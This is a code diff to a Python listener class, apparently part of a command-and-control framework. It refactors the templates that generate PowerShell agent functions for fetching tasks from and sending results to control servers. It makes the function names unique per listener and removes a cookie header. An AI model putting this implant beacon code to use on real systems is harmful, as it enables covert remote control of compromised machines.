@@ -493,10 +493,11 @@ class Listener:
             if self.options['SupListeners']['Value'] != '':
                 listeners = self.options['SupListeners']['Value'].split(',')
                 active_listeners = self.mainMenu.listeners.activeListeners
-
+                loaded_listeners = self.mainMenu.listeners.loadedListeners
                 #iterate through the listeners to retrieve options for each one and generate commCode
                 for l in listeners:
-                    commsCode = self.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
+                    loadedlistener = loaded_listeners[active_listeners[l]["moduleName"]]
+                    commsCode = loadedlistener.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
                     code = code.replace('#LISTENER_DICT', commsCode[0])\
                            .replace('#COMM_FUNCTION', commsCode[1])\
                            .replace('#TASK_FUNCTION',commsCode[2])
@@ -545,8 +546,7 @@ class Listener:
     jitter = {jitter}
     profile= "{profile}"
     fixed_parameters= @{{
-        headers = @{{UserAgent= "{UA}"
-                     Cookie="{cookie}"}}
+        headers = @{{UserAgent= "{UA}"}}
         taskURIs = "{taskURIs}"
         }}
     send_func= $script:{send_func}
@@ -567,7 +567,6 @@ class Listener:
            defaultResponse = b64DefaultResponse,
            UA = profile.split('|')[1],
            name = listenerOptions['Name']['Value'],
-           cookie = self.options['Cookie']['Value'],
            taskURIs = profile.split('|')[0])
 
 
@@ -587,7 +586,7 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    $script:GetTask = {{
+                    $script:GetTask{name} = {{
                         param($FixedParameters)
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
@@ -599,7 +598,7 @@ class Listener:
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
                                 $Headers = "{reqheader}: $RoutingCookie"
-                                $FixedParameters["headers"].GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
+                                $FixedParameters["headers"].GetEnumerator()| %{{ $Headers += "`r`n$($_.Name): $($_.Value)" }}
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
@@ -622,10 +621,10 @@ class Listener:
                         }}
                     }}
                     #TASK_FUNCTION
-                """.format(ControlServers = updateServers,reqheader = listenerOptions['RequestHeader']['Value'])
+                """
 
                 sendMessage = """
-                    $script:SendMessage = {{
+                    $script:SendMessage{name} = {{
                         param($Packets,$FixedParameters)
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
@@ -668,7 +667,9 @@ class Listener:
                 """
 
                 return (listener_dict,
-                        getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']),
+                        getTask.format(ControlServers = updateServers,
+                                       name = listenerOptions['Name']['Value'],
+                                       reqheader = listenerOptions['RequestHeader']['Value']),
                         sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             else:
